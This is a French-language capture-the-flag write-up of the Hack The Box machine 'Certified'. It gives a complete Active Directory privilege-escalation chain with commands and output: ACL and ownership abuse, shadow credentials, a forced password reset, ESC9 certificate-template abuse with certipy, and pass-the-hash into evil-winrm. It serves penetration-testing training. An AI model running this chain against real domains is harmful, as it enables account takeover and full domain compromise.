# Certified


![Certified](/images/Certified/certified.png)

`Certified` est une machine Windows de difficulté moyenne conçue pour un scénario de violation présumé, où les identifiants d'un utilisateur à faibles privilèges sont fournis. Pour accéder au compte `management_svc`, les listes de contrôle d'accès (ACL) des objets privilégiés sont énumérées, ce qui nous amène à découvrir que `judith.mader`, qui dispose de l'ACL `write owner` sur le groupe `management`, dispose de `GenericWrite` sur le compte  `management_svc`, ce dernier permettant ainsi l'authentification auprès de la cible via `WinRM` et l'obtention du flag user. L'exploitation du service de certificats Active Directory (ADCS) est nécessaire pour accéder au compte `Administrator` en abusant du `shadow credentials` et de `ESC9`.


## Énumération

Nous démarrons la machine Certified avec les identifiants suivants `judith.mader:judith09`


### Nmap

Le scan révèle plusieurs ports ouverts :
- 53 pour le DNS.
- 88 pour le Kerberos.
- 389 pour le LDAP
- 445 pour le SMB.
- 636 pour le LDAPS
- 5985 pour WinRM

```
╰─➤  nmap 10.129.2.225 --min-rate 5000 -p- -sV -sC -Pn -oN nmap.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-20 22:44 CEST
Nmap scan report for 10.129.2.225
Host is up (0.096s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-21 03:45:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-06-21T03:46:51+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-21T03:46:50+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-21T03:46:51+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-21T03:46:50+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
49758/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-06-21T03:46:14
|_  start_date: N/A
```


### SMB

Rien d'intéressant en énumérant les partages.
```
╰─➤  nxc smb certified.htb -u judith.mader -p judith09 --shares
SMB         10.129.2.225    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.2.225    445    DC01             [+] certified.htb\judith.mader:judith09
SMB         10.129.2.225    445    DC01             [*] Enumerated shares
SMB         10.129.2.225    445    DC01             Share           Permissions     Remark
SMB         10.129.2.225    445    DC01             -----           -----------     ------
SMB         10.129.2.225    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.2.225    445    DC01             C$                              Default share
SMB         10.129.2.225    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.2.225    445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.2.225    445    DC01             SYSVOL          READ            Logon server share
```


## Shell en tant management_svc
### BloodHound


```
╰─➤  bloodhound-python -u 'judith.mader' -p 'judith09' -d certified.htb -ns 10.129.2.225 -c All --zip                                                   2 ↵
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 26S
INFO: Compressing output into 20250620225141_bloodhound.zip
```


`judith.mader` a le droit `WriteOwner` sur le groupe `management`. Les étapes d'exploitation sont les suivantes :
1. Rendre judith.mader propriétaire du groupe.
2. Donner le contrôle total du groupe à judith.mader.
3. Ajouter judith.mader au groupe management.
![](/images/Certified/bloodhound1.png)

Je change le propriétaire du groupe management avec le module `owneredit` de `Impacket`.
```
╰─➤  owneredit.py -action write -new-owner "judith.mader" -target "management" "certified.htb"/"judith.mader":'judith09'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```


Ensuite, je donne le contrôle total à judith.mader avec le module `dacledit` de `Impacket`.
```
╰─➤  dacledit.py -action 'write' -rights 'FullControl' -principal 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20250620-231847.bak
[*] DACL modified successfully!
```


Ajout de judith.mader dans le groupe management.
```
╰─➤  bloodyAD --host '10.129.2.225' -u 'judith.mader' -p 'judith09' add groupMember 'management' 'judith.mader'                                       130 ↵ 
[+] judith.mader added to management
```


### Shadow Credentials

Par la suite, je vois que les membres du groupe management, on le droit `GenericWrite` sur l'utilisateur `management_svc`. Ceux que judith.mader peut obtenir le hash NTLM de managment_svc.
![](/images/Certified/bloodhound2.png)


`Shadow Credential` sur managment_svc. La commande génère le fichier de certificat avec la clé privée au format de fichier `pem`.
```
╰─➤  bloodyAD --host 10.129.2.225 -u 'judith.mader' -p 'judith09' -d certified.htb add 'shadowCredentials' 'management_svc'

[+] KeyCredential generated with following sha256 of RSA key: 4a9e3b4a072d864845b4c601ddaf45cd0580f29b9e2528901186e2a421cdec69
No outfile path was provided. The certificate(s) will be stored with the filename: bmxwKuqv
[+] Saved PEM certificate at path: bmxwKuqv_cert.pem
[+] Saved PEM private key at path: bmxwKuqv_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem bmxwKuqv_cert.pem -key-pem bmxwKuqv_priv.pem certified.htb/management_svc bmxwKuqv.ccache
```


Utilisation de `PKINITOOLS` pour obtenir un TGT Kerberos (ticket-granting-ticket) pour le compte management_svc.
```
╰─➤  gettgtpkinit.py -cert-pem bmxwKuqv_cert.pem -key-pem bmxwKuqv_priv.pem certified.htb/management_svc management.ccache

2025-06-21 06:39:07,127 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-06-21 06:39:07,143 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-06-21 06:39:19,718 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-06-21 06:39:19,718 minikerberos INFO     fed0e233abea622ddcd76397eaf56bf3b7948f256e2fbc6c92be350b48ae18a2
INFO:minikerberos:fed0e233abea622ddcd76397eaf56bf3b7948f256e2fbc6c92be350b48ae18a2
2025-06-21 06:39:19,723 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```


Définir la variable d'environnement `KRB5CCNAME` pour qu'elle pointe vers le fichier `management.ccache` précédemment généré.
```
export KRB5CCNAME=management.ccache
```


J'utilise `getnthash.py` pour récupérer le hash NTLM du compte management_svc.
```
╰─➤  getnthash.py -key fed0e233abea622ddcd76397eaf56bf3b7948f256e2fbc6c92be350b48ae18a2 certified.htb/management_svc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
<hash de management_svc>
```


## Shell en tant qu'administrator
### GenericAll sur ca_operator

Comme vu sur `BloodHound`, `management_svc` a le droit `GenericAll` sur l'utilisateur `ca_operator`. Cela lui permet donc de changer le mot de passe de ce dernier.
```
╰─➤  bloodyAD --host 10.129.2.225 -u 'management_svc' -p ':<hash de management_svc>' -d certified.htb set password 'ca_operator' 'Password@2025'
[+] Password changed successfully!
```


### ESC9

Après énumération des templates et des certificats, je vois que le template `CertifiedAuthentication` est vulnérable à une ESC9.
```
certipy find -u 'ca_operator' -p 'Password@2025' -d 'certified.htb' -vulnerable -stdout
```


Je synchronise le temps entre ma machine et la cible.
```
# faketime "$(rdate -n dc01.certified.htb -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```


J'obtiens le hash NT de `ca_operator`.
```
# certipy shadow auto -username "management_svc@certified.htb" -hashes ":<hash de management_svc>" -account 'ca_operator'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '830846d5-5f20-aef4-d672-f15818faf3c4'
[*] Adding Key Credential with device ID '830846d5-5f20-aef4-d672-f15818faf3c4' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '830846d5-5f20-aef4-d672-f15818faf3c4' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': <hash de ca_operator>
```


Ensuite, le `userPrincipalName` de `ca_operator` est modifié en `administrator`.
```
# certipy account update -username "management_svc@certified.htb" -hashes ":a091c1832bcdd4677c28b5a6a1295584" -user 'ca_operator' -upn 'administrator'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```


Le certificat vulnérable peut être demandé en tant que `ca_operator`.
```
# certipy req -username "ca_operator@certified.htb" -hashes "<hash de ca_operator>" -target "dc01.certified.htb" -ca 'certified-DC01-CA' -template 'CertifiedAuthentication' -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.certified.htb' at '8.8.8.8'
[+] Trying to resolve 'CERTIFIED.HTB' at '8.8.8.8'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.2.225[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.2.225[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```


L'UPN de `ca_operator` est reconverti en quelque chose d'autre.
```
# certipy account update -username "management_svc@certified.htb" -hashes ":a091c1832bcdd4677c28b5a6a1295584" -user 'ca_operator' -upn "ca_operator@certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```


Désormais, l'authentification avec le certificat obtenu fournira le hash NT de l'utilisateur `administrator`.
```
# certipy auth -pfx 'administrator.pfx' -domain "certified.htb"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': 
aad3b435b51404eeaad3b435b51404ee:<hash de administrator>
```


### WinRM

Maintenant je peux avoir un shell en tant que `administrator` et chercher les deux flags.
```
# evil-winrm -u "administrator" -H "<hash de administrator>" -i "10.129.2.225"

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type "C:/Users/Administrator/Desktop/root.txt"
4<ROOT FLAG REDACTED>6
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd "C:/users/management_svc/Desktop"
*Evil-WinRM* PS C:\users\management_svc\Desktop> type user.txt
1<USER FLAG REDACTED>5
*Evil-WinRM* PS C:\users\management_svc\Desktop>
```

